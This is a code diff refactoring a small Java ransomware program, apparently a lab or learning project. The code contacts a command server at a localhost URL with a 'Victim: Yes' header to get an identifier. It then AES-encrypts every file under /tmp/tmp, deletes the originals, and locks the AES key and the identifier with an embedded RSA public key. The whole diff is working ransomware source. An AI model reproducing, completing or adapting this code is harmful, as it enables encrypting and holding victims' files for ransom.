@@ -4,7 +4,6 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.file.Files;
@@ -12,15 +11,11 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.security.AlgorithmParameters;
 import java.security.KeyFactory;
-import java.security.MessageDigest;
-import java.security.NoSuchAlgorithmException;
 import java.security.PublicKey;
 import java.security.SecureRandom;
-import java.security.spec.InvalidKeySpecException;
 import java.security.spec.KeySpec;
 import java.security.spec.X509EncodedKeySpec;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Base64;
 import java.util.List;
 import java.util.Random;
@@ -32,15 +27,10 @@ import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.SecretKeySpec;
 import javax.crypto.SecretKey;
 
-class secret {
-	private String req_url="http://127.0.0.1/recv.php";
-	private static byte[] key;
-	private static SecretKeySpec secrets;
+class secrets {
 	private static Cipher cipher;
-	private static String publicKey  = "-----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmPgtRSaWIL5XbY+B0oQVNfdUhPqs8/C1bXIzDGhvP6mw5h+Ma8Yzxt72mnGxb0WSkA1GlV7ku3pWK5gN1SnlzheuAqWdWo9UeJODPEKjE3V5eWv5QLQLNF5bw6xJVg/VTegS0IHzx5V3R53AfpGbRbaW2xdWnEQb1xM7C+dm/b5TwC0Ph295LViDlPeiZOF/ulpRExHYos4liFEohqsPdtI7/opo8KKi9p3ZrULMUqTvEn3MfCoyuWVTnR8QqOaLNV1lyuptQHpJUgxQn43p9EdTnEcXXdSaJ88+Wok9BIJB73bXd9/YHQIGXHC5RVj3nNEysyDBDx4ThuYaMm5BjCoFIPN8E4ce+tDWOp1FpMwct1oupMkwsEbp7zVKMLAECVlKSNICY2kR64U4g1/XtkPD8+/wd/No1buan5eTmUiOsao/7HoQSI3vuMGr2dNQl0daNp/0JNkLWSu8hrABDcIQD6YnkzGFiuTvB3JHv9HiinU9IUPgh+1jUuIUtDg0mlgH/wjkuTVCIPpEmfXdhb6yofhXM/Y5Jk6GNU3G4SX9M5NQ0rcKoMXNu2Je7BXMrL9E78JVViM8KBDJLvPdSVExTWzQP586SazRgI6VlK9MH0Yom0h89yTa5G8XjoFVPiSSXUkog/sl7g4Cs8LCL7VrE0xuiT+3TyCUlQESGFUCAwEAAQ==-----END PUBLIC KEY-----";
-	private String identifier;
+
 	void setKey(String myKey) throws Exception{
-		MessageDigest sha = null;
 		byte[] salt = new byte[8];
 		SecureRandom secureRandom = new SecureRandom();
 		secureRandom.nextBytes(salt);
@@ -50,17 +40,17 @@ class secret {
 		SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
 		KeySpec keySpec = new PBEKeySpec(myKey.toCharArray(),salt,65536,256);
 		SecretKey secretKey = factory.generateSecret(keySpec);
-		secrets = new SecretKeySpec(secretKey.getEncoded(), "AES");
+		SecretKeySpec secrets = new SecretKeySpec(secretKey.getEncoded(), "AES");
 
 		cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-		cipher.init(Cipher.ENCRYPT_MODE,secrets);
+		cipher.init(Cipher.ENCRYPT_MODE, secrets);
 		AlgorithmParameters params = cipher.getParameters();
                 FileOutputStream ivOutFile = new FileOutputStream("/tmp/tmp/iv.enc");
                 byte[] iV = params.getParameterSpec(IvParameterSpec.class).getIV();
                 ivOutFile.write(iV);
                 ivOutFile.close();
 	}
-	void encryptFiles(int cipherMode,String inputFile,String outputFile,String secret) throws Exception{
+	void encryptFiles(String inputFile, String outputFile) throws Exception{
 		byte[] textString = new byte[64];
 		FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
 		FileInputStream fileInputStream = new FileInputStream(inputFile);
@@ -81,7 +71,8 @@ class secret {
     String initiaiteConnection() throws Exception{
         return sendPOST();
     }
-	void encryptAESkey(String supersecretKey) throws Exception{
+	void encryptAESkey(String supersecretKey,String file_name) throws Exception{
+		String publicKey = "-----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmPgtRSaWIL5XbY+B0oQVNfdUhPqs8/C1bXIzDGhvP6mw5h+Ma8Yzxt72mnGxb0WSkA1GlV7ku3pWK5gN1SnlzheuAqWdWo9UeJODPEKjE3V5eWv5QLQLNF5bw6xJVg/VTegS0IHzx5V3R53AfpGbRbaW2xdWnEQb1xM7C+dm/b5TwC0Ph295LViDlPeiZOF/ulpRExHYos4liFEohqsPdtI7/opo8KKi9p3ZrULMUqTvEn3MfCoyuWVTnR8QqOaLNV1lyuptQHpJUgxQn43p9EdTnEcXXdSaJ88+Wok9BIJB73bXd9/YHQIGXHC5RVj3nNEysyDBDx4ThuYaMm5BjCoFIPN8E4ce+tDWOp1FpMwct1oupMkwsEbp7zVKMLAECVlKSNICY2kR64U4g1/XtkPD8+/wd/No1buan5eTmUiOsao/7HoQSI3vuMGr2dNQl0daNp/0JNkLWSu8hrABDcIQD6YnkzGFiuTvB3JHv9HiinU9IUPgh+1jUuIUtDg0mlgH/wjkuTVCIPpEmfXdhb6yofhXM/Y5Jk6GNU3G4SX9M5NQ0rcKoMXNu2Je7BXMrL9E78JVViM8KBDJLvPdSVExTWzQP586SazRgI6VlK9MH0Yom0h89yTa5G8XjoFVPiSSXUkog/sl7g4Cs8LCL7VrE0xuiT+3TyCUlQESGFUCAwEAAQ==-----END PUBLIC KEY-----";
 		String pubKey = publicKey.replaceAll("-","").replaceAll("BEGIN PUBLIC KEY","").replaceAll("END PUBLIC KEY","");
 		byte[] publickBytes = Base64.getDecoder().decode(pubKey);
 		X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publickBytes);
@@ -90,14 +81,15 @@ class secret {
 		Cipher cipher = Cipher.getInstance("RSA");
 		cipher.init(Cipher.ENCRYPT_MODE,public_Key);
 		byte[] cipherText = cipher.doFinal(supersecretKey.getBytes());
-		FileOutputStream fileOutputStream = null;
-		fileOutputStream = new FileOutputStream("/tmp/tmp/key.enc");
+		FileOutputStream fileOutputStream;
+		fileOutputStream = new FileOutputStream(file_name);
 		fileOutputStream.write(cipherText);
 		fileOutputStream.close();
 	}
 
     String sendPOST() throws IOException{
-        URL obj = new URL(req_url);
+		String req_url = "http://127.0.0.1/recv.php";
+		URL obj = new URL(req_url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
         con.addRequestProperty("Victim", "Yes");
@@ -116,19 +108,19 @@ class secret {
 		}
 		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
 		String inputLine;
-		StringBuffer response = new StringBuffer();
+		StringBuilder response = new StringBuilder();
 		while((inputLine = in.readLine()) != null){
 			response.append(inputLine);
 		}
 		in.close();
-		identifier = response.toString();
+		String identifier = response.toString();
 		return identifier;
     }
 }
 
 class RansomwareActivate{
 	private String supersecretKey = "";
-	String chars = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890";
+	String chars = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890!@_-$";
 	String generateKey(){
 		Random r = new Random();
 		int i;
@@ -140,9 +132,9 @@ class RansomwareActivate{
 
 	String encryptAllFiles() throws Exception{
 		supersecretKey = generateKey();
-		secret sec = new secret();
+		secrets sec = new secrets();
 		sec.setKey(supersecretKey);
-		List<Path> fileNames = new ArrayList<Path>();
+		List<Path> fileNames = new ArrayList<>();
 		Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
 		paths.filter(Files::isRegularFile).forEach(fileNames::add);
 		Path salt_path = Paths.get("/tmp/tmp/salt.enc");
@@ -151,7 +143,7 @@ class RansomwareActivate{
 		fileNames.remove(iv_path);
 		for(Path file:fileNames){
 			System.out.println("Encrypting file: "+file.toString());
-			sec.encryptFiles(Cipher.ENCRYPT_MODE, file.toString(),file.toString()+".enc",supersecretKey);
+			sec.encryptFiles(file.toString(),file.toString()+".enc");
 			File f = new File(file.toString());
 			f.delete();
 		}
@@ -161,15 +153,28 @@ class RansomwareActivate{
 
 class encrypt {
 	private static String key_aes = "";
+	public static String iden;
 	static String activate() throws Exception{
 		RansomwareActivate ransomware  = new RansomwareActivate();
 		key_aes =  ransomware.encryptAllFiles();
 		return key_aes;
 	}
+	public static String Identifier(){
+		return iden;
+	}
 	public static void main(String[] args) throws Exception{
-		secret sec = new secret();
-		String identifier = sec.initiaiteConnection();
-		key_aes = activate();
-		sec.encryptAESkey(key_aes);
+		secrets sec = new secrets();
+		String res = sec.initiaiteConnection();
+		if(res.equals("Not reachable!")){
+			System.exit(0);
+		}
+		else {
+			iden = res;
+			System.out.println(iden);
+			File f = new File("/tmp/tmp/id.enc");
+			key_aes = activate();
+			sec.encryptAESkey(key_aes,"/tmp/tmp/key.enc");
+			sec.encryptAESkey(iden,"/tmp/tmp/id.enc");
+		}
 	}
 }
